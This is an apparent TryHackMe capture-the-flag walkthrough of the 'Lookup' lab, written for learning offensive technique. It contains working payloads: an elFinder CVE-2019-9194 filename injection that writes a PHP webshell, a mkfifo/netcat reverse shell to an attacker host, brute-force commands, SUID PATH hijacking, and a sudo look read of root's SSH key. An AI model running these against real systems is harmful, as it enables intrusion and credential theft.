---
title: "TryHackMe Lookup — Walkthrough"
date: 2026-02-08 19:00:00 +0300
categories: [TryHackMe, Web]
tags: [elfinder, cve-2019-9194, path-hijacking, suid, hydra, sudo]
pin: false
---

Lookup flows from **login user enumeration**, **elFinder CVE-2019-9194** command injection, **SUID `/usr/sbin/pwm` PATH hijacking**, **Hydra** on SSH, **`sudo look`** arbitrary read, plus an optional **www-data → root** shortcut via **`pwm`** symlink abuse.

## Initial Enumeration

### Nmap scan

```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

| Port | Service |
| ---- | ------- |
| 22 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 |
| 80 | Apache 2.4.41 — redirects to `http://lookup.thm` |

```text
<TARGET_IP> lookup.thm
```

Landing page: **login form**.

## Shell as www-data

### Brute-forcing credentials

Random creds → **`Wrong username or password.`**

Username **`admin`** → **`Wrong password.`** (distinct message leaks valid users).

User enumeration:

```bash
ffuf -u 'http://lookup.thm/login.php' -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=FUZZ&password=test' \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -mc all -ic -fs 74 -t 100
```

Valid users: **`admin`**, **`jose`**.

Password spray for **`jose`**:

```bash
ffuf -u 'http://lookup.thm/login.php' -X POST \
  -d 'username=jose&password=FUZZ' \
  -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt \
  -mc all -ic -fs 62 -t 100
```

Password: **`pa[REDACTED]23`**.

Login redirects to **`http://files.lookup.thm/`**:

```text
<TARGET_IP> lookup.thm files.lookup.thm
```

### elFinder command injection (CVE-2019-9194)

`http://files.lookup.thm/` → **`/elFinder/elfinder.html`**

Version **2.1.47** — vulnerable to **CVE-2019-9194**.

Root cause: **`imgRotate()`** builds **`exiftran`** command with unescaped **`$path`** instead of **`$quotedPath`** after `escapeshellarg()`. Attacker controls filename → shell metacharacters in **`sh`**.

Exploit steps:

1. Upload a normal JPEG.
2. Rename to:

```text
$(echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php).jpg
```

(hex = `<?php system($_GET["c"]); ?>`)

3. **Resize & Rotate** → rotate → **Apply** (expect rotate error — payload already ran).

Webshell:

```bash
curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell:

```bash
curl -s 'http://files.lookup.thm/elFinder/php/shell.php' -G \
  --data-urlencode 'c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f'
```

## Shell as think

### Reverse-engineering SUID pwm

```bash
find / -perm -u=s 2>/dev/null
/usr/sbin/pwm
```

Running **`/usr/sbin/pwm`**:

- Executes **`id`** via **`popen("id")`**
- Parses username from `uid=%*u(%[^)])`
- Opens **`/home/<user>/.passwords`** and prints contents

As **`www-data`**, **`/home/www-data/.passwords`** missing. File exists at **`/home/think/.passwords`** (root:think, 525 bytes).

Copy binary to web root and analyze in **Ghidra** — confirms relative **`id`** invocation (PATH hijackable).

### Path hijacking

Create fake **`id`**:

```bash
echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > /tmp/id
chmod 777 /tmp/id
export PATH=/tmp:$PATH
which id   # /tmp/id
/usr/sbin/pwm
```

Output includes password list entries such as **`jose1006`**, **`jose.2856171`**, etc.

### Brute-forcing SSH

```bash
hydra -l think -P passwords.txt ssh://lookup.thm
# valid: jo[REDACTED]k)
```

```bash
ssh think@lookup.thm
think@lookup:~$ wc -c user.txt
33 user.txt
```

## Shell as root

### sudo look arbitrary read

```bash
think@lookup:~$ sudo -l
User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

**`look '' /file`** prints entire file (GTFOBins):

```bash
sudo /usr/bin/look '' /root/.ssh/id_rsa
```

Save key, **`chmod 600`**, SSH as root:

```bash
ssh -i id_rsa root@lookup.thm
root@lookup:~# wc -c root.txt
33 root.txt
```

## Unintended www-data to root

**`pwm`** trusts parenthetical capture from **`id`** output as username without sanitization.

Craft **`id`** returning traversal username:

```bash
echo -e '#!/bin/bash\necho "uid=33(../var/www/html) gid=33(www-data) groups=33(www-data)"' > /var/www/html/id
chmod 777 /var/www/html/id
export PATH=/var/www/html:$PATH
```

Builds path **`/home/../var/www/html/.passwords`** → **`/var/www/html/.passwords`**.

Because **`fs.protected_symlinks`** blocks symlinks from world-writable dirs like **`/tmp`**, place symlink under **`/var/www/html`**:

```bash
ln -s /root/.ssh/id_rsa /var/www/html/.passwords
/usr/sbin/pwm
```

Prints root private key — same SSH path to root without **`think`** pivot.

## Takeaways

- **Different login errors** enable fast username enumeration.
- **elFinder 2.1.47** filename handling = command injection.
- **Relative command execution + PATH** turns SUID helpers into secret readers.
- **`look` with empty string** is full file read under sudo.
